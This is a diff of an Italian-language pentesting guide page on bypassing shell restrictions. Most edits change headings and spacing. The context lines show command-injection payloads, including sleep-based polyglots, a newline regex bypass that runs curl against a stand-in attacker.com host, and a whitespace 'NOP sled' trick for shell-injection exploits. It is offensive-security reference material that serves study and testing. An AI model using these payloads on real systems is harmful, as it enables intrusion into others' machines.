@@ -202,7 +202,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Bypassare potenziali regex
+### Bypass potenziali regex
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -298,17 +298,19 @@ ln /f*
 
 Se ti trovi all'interno di un filesystem con le **protezioni read-only e noexec** o anche in un container distroless, ci sono ancora modi per **eseguire binari arbitrari, anche una shell!:**
 
+
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
 ## Bypass di Chroot e altre Jails
 
+
 {{#ref}}
 ../privilege-escalation/escaping-from-limited-bash.md
 {{#endref}}
 
-## NOP Sled Basato su Spazio ("Bashsledding")
+## Bash NOP Sled Basato su Spazio ("Bashsledding")
 
 Quando una vulnerabilità ti consente di controllare parzialmente un argomento che alla fine raggiunge `system()` o un'altra shell, potresti non conoscere l'offset esatto in cui l'esecuzione inizia a leggere il tuo payload. I tradizionali NOP sled (ad es. `\x90`) **non** funzionano nella sintassi della shell, ma Bash ignorerà in modo innocuo gli spazi bianchi iniziali prima di eseguire un comando.
 
@@ -328,7 +330,7 @@ Casi d'uso pratici:
 
 > 🛠️  Combina questo trucco con gadget ROP che chiamano `system()` per aumentare drasticamente l'affidabilità dell'exploit su router IoT con memoria limitata.
 
-## Riferimenti e ulteriori informazioni
+## Riferimenti e altro
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
